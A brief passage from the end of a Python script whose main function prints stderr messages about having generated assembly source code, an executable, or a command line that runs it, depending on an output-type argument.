      sys.stderr.write(commands)
    elif args.type == 'plain':

      sys.stderr.write('[?] Generated plain assembly\'s source code/executable.\n')
    elif args.type in ['exec', 'run-command']:

      sys.stderr.write('[?] Generated command line executing assembly\'s source code/executable.\n')

if __name__ == '__main__':
    main(sys.argv)
